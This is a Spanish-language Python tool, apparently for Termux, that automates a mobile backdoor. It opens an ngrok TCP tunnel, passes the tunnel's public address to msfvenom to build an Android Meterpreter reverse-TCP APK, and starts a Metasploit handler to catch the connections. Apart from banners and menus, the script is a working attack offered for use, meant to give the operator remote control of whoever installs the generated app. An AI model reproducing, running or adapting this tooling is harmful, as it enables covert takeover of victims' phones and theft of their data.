import os,sys,time,subprocess
while True:
 try:
  import requests
  break
 except ModuleNotFoundError:
  os.system("pip install requests")
while True:
 try:
  from lolpython import lol_py
  break
 except ModuleNotFoundError:
  os.system("pip install lolpython")
class color:
    morado = '\033[95m'
    blanco = '\033[97m'
    cyan = '\033[96m'
    azul  = '\033[94m'
    verde = '\033[92m'
    amarillo = '\033[93m'
    rojo = '\033[91m'
    fin = '\033[0m'

r= requests.get("https://raw.githubusercontent.com/Fenrir-00/venontx/main/version.txt")
r=r.text
print(r)
if r != "version=1.3\n":
 sys.exit()
 print(f"""{color.rojo}HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO
HAY UNA NUEVA VERSION ACTUALIZA EL REPOSITORIO""")

def banner():
 os.system("clear")
 print(f"""{color.cyan}
███████╗███████╗███╗  ██╗██████╗ ██╗██████╗
██╔════ ██╔════╝████╗ ██║██╔══██╗██║██╔══██╗
█████╗  █████╗  ██╔██╗██║██████╔╝██║██████╔╝
██╔══   ██╔══╝  ██║╚████║██╔══██╗██║██╔══██╗
██║     ███████╗██║ ╚███║██║  ██║██║██║  ██║
╚═╝     ╚══════╝╚═╝  ╚══╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝{color.fin}""")

def version():
 texto ="""
 |=======================================================|
 | Script by              : #FENRIR-00                   |
 | Version                : Version  1.0                 |
 | Follow me on Github    : https://github.com/Fenrir-00 |
 | Contact me on Telegram : @Ritorito1990                |
 ========================================================= """
 lol_py(texto)
 print()

def menu():
    os.system("clear")
    cabecera()
    version()
    print()
    print(f"{color.morado}TE GUSTARIA CREAR UN PAYLOAD")
    print("")
    print(f"{color.verde}[1] CREAR PAYLOAD")
    print(f"{color.rojo}[0]SALIR{color.fin}")
    print()
    eleccion =input(f"{color.cyan}ELIJE UN NUMERO >>{color.fin} ")
    if eleccion == "1" :
     ngrok()
     msf()
    elif eleccion == "0" :
     banner
     salir() 
    else:
        incorrecto()
def salir():
    os.system("clear")
    banner()
    print(f"{color.rojo}")
    print("""SALIENDO…
    █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
    time.sleep(1)
    os.system("clear")
    banner()
    print(f"{color.rojo}")
    print("""SALIENDO…10%
    ███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
    time.sleep(1)
    os.system("clear")
    banner()
    print(f"{color.rojo}")
    print("""SALIENDO…30%
    █████▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
    time.sleep(1)
    os.system("clear")
    banner()
    print(f"{color.rojo}")
    print("""SALIENDO…50%
    ██████████▒▒▒▒▒▒▒▒▒""")
    time.sleep(1)
    os.system("clear")
    banner()
    print(f"{color.rojo}")
    print("""SALIENDO…70%
    █████████████▒▒▒▒▒▒""")
    time.sleep(1)
    os.system("clear")
    banner()
    print(f"{color.rojo}")
    print("""SALIENDO…100%
    ███████████████████""")
    time.sleep(1)
    os.system("clear")
    print(f"{color.fin}")
    sys.exit()

def incorrecto():
    os.system("clear")
    print(f"""{color.rojo}
░█████╗░██████╗░░█████╗░██╗░█████╗░███╗░░██╗
██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗████╗░██║
██║░░██║██████╔╝██║░░╚═╝██║██║░░██║██╔██╗██║
██║░░██║██╔═══╝░██║░░██╗██║██║░░██║██║╚████║
╚█████╔╝██║░░░░░╚█████╔╝██║╚█████╔╝██║░╚███║
░╚════╝░╚═╝░░░░░░╚════╝░╚═╝░╚════╝░╚═╝░░╚══╝
██╗███╗░░██╗░█████╗░░█████╗░██████╗░██████╗░
██║████╗░██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██║██╔██╗██║██║░░╚═╝██║░░██║██████╔╝██████╔╝
██║██║╚████║██║░░██╗██║░░██║██╔══██╗██╔══██╗
██║██║░╚███║╚█████╔╝╚█████╔╝██║░░██║██║░░██║
╚═╝╚═╝░░╚══╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝
███████╗░█████╗░████████╗░█████╗░
██╔════╝██╔══██╗╚══██╔══╝██╔══██╗
█████╗░░██║░░╚═╝░░░██║░░░███████║
██╔══╝░░██║░░██╗░░░██║░░░██╔══██║
███████╗╚█████╔╝░░░██║░░░██║░░██║
╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝{color.fin}""")
    time.sleep(4)
    menu()

def cabecera():
 os.system("clear")
 print(f"""{color.cyan}

██╗   ██╗███████╗███╗  ██╗ █████╗ ███╗  ██╗████████╗██╗  ██╗
██║   ██║██╔════╝████╗ ██║██╔══██╗████╗ ██║╚══██╔══╝╚██╗██╔╝
╚██╗ ██╔╝█████╗  ██╔██╗██║██║  ██║██╔██╗██║   ██║    ╚███╔╝
 ╚████╔╝ ██╔══╝  ██║╚████║██║  ██║██║╚████║   ██║    ██╔██╗
  ╚██╔╝  ███████╗██║ ╚███║╚█████╔╝██║ ╚███║   ██║   ██╔╝╚██╗
   ╚═╝   ╚══════╝╚═╝  ╚══╝ ╚════╝ ╚═╝  ╚══╝   ╚═╝   ╚═╝  ╚═╝""")

def ngrok():
 banner()
 print(f"{color.morado}ARRANCANDO NGROK ESPERE......")
 time.sleep(3)
 os.system('./ngrok tcp 4444 &>/dev/null & clear')
 time.sleep(7)
 r= requests.get("http://127.0.0.1:4040/api/tunnels")
 r=r.text
 banner()
 print(f"{color.morado}NGROK ESTA ARRANCANDO......")
 host=(r[89:103])
 port=(r[104:108:])
 if len(host) == 0:
  banner()
  print(f"""
{color.rojo}       ¡¡¡NGROK NO SE PUDO INICIAR!!!
COMPRUEBA QUE NO ESTAS CON WIFI Y QUE TIENES LA ZONA WIFI ACTIVADA
""")
  time.sleep(7)
  exit()
 else:
  print(f"{color.verde}ESTE ES TU HOST:{color.amarillo}{host}")
  print(f"{color.verde}ESTE ES TU PORT:{color.amarillo}{port}")
  print(f"""{color.morado}CREANDO PAYLOAD..........{color.fin}""")
  os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={host} LPORT={port} R > /sdcard/nombredelapp.apk')
  banner()
  print(f"{color.verde}NGROK ESTA ARRANCADO......[✓]")
  print(f"{color.verde}PAYLOAD CREADO PERFECTAMENTE........[✓]")
  time.sleep(4)
def msf():
 var=os.system("which msfconsole")
 banner()
 if var == 0:
   banner()
   os.system('msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp ; set lhost 127.0.0.1; set lport 4444;set ExitOnSession false"')
 else :
   print(f"""{color.rojo}
          METASPLOIT NO ESTA INSTALADO 
        PROCEDIENDO A INSTALARLO TARDARA
           UN RATO NO TENGAS PRISA{color.fin}""")
   time.sleep(6)
   subprocess.run(['bash','./metasploit.sh'])
   banner()
   print(f"""{color.verde}METASPLOIT INSTALADO [✓]
EJECUTA EL SCRIPT OTRA VEZ
{color.amarillo}PUEDE DESINSTALAR LOS BANER VUELVE A PONERLO{color.fin}""")
   sys.exit()

menu()
